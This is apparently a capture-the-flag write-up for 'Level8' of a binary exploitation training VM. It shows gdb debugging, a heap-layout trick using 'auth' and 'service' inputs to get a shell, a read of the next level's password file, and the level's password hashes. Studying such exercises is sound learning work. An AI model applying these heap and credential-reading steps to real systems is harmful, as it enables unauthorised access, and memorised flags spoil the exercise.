# Level8 - Very long main

## Local script usage

```shell
Usage: ./main.sh
```

## Passwords and token

|        |                                                                    |
| ------ | ------------------------------------------------------------------ |
| level8 | `5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9` |
| level9 | `c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a` |

## Steps to resolve on VM

Note: We will use `gdb-peda`. You can setup peda with the script: [scripts/installPeda.sh](../../scripts/installPeda.sh)

Execute level8

```shell
./level8
> (nil), (nil)
a
> (nil), (nil)
b
(...)
```

Lets debug the binary

```shell
(gdb) info functions
0x08048564  main
```

See our assembly interpretation in [source file](../source.c)

To access to the new access, the byte at `*auth + 0x20` has to be not null.

It means `0x804a008 + 0x20` => `0x804a028` has to be not null

First we have to define `auth`:

```shell
~/level8
> (nil), (nil) # auth, service
auth a
> 0x804a008, (nil)  # auth, service
```

Malloc returns a pointer to `0x804a008`

If the input is "service", it calls `strdup` and allocates a new part of memory.

```shell
service
> 0x804a008, 0x804a018  # auth, service
```

The pointer `service` aims to 0x804a018.

Two solutions:

- either allocate a new part of memory starting at `0x804a028` using `strdup`:

```shell
> 0x804a008, 0x804a018  # auth, service
service
> 0x804a008, 0x804a028 # auth, service
login
$ # here the shell is
```

- _(after restart ./level8 to set `service` at `null`)_ <br />
  or write a string big enough to erase the address `0x804a028`: (`0x804a028 - 0x804a010 = 0x10` => 16 bytes)

```shell
> 0x804a008, (nil)  # auth, service
service0123456789abcdef
> 0x804a008, 0x804a028 # auth, service
login
$ # here the shell is
```

Finally we can get the pass !

```shell
$ whoami
> level9
$ cat /home/user/level9/.pass
> c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```

---

## Sources

### ASM

- [What do the assembly instructions 'seta' and 'setb' do after repz cmpsb?](https://stackoverflow.com/questions/44630262/what-do-the-assembly-instructions-seta-and-setb-do-after-repz-cmpsb/44630741)
- [REPNZ SCAS Assembly Instruction Specifics](https://stackoverflow.com/questions/26783797/repnz-scas-assembly-instruction-specifics)
- [x86 Registers](https://www.eecg.utoronto.ca/~amza/www.mindsec.com/files/x86regs.html)
- [x86 Instruction Set Reference - REP/REPE/REPZ/REPNE/REPNZ](https://c9x.me/x86/html/file_module_x86_id_279.html)

### Shell

- [Man fgets](https://linux.die.net/man/3/fgets)
- [Man free](https://linux.die.net/man/3/free)
- [Man fwrite](https://linux.die.net/man/3/fwrite)
- [Man malloc](https://linux.die.net/man/3/malloc)
- [Man printf](https://linux.die.net/man/3/printf)
- [Man strcpy](https://linux.die.net/man/3/strcpy)
- [Man strdup](https://linux.die.net/man/3/strdup)
- [Man system](https://linux.die.net/man/3/system)

```

```
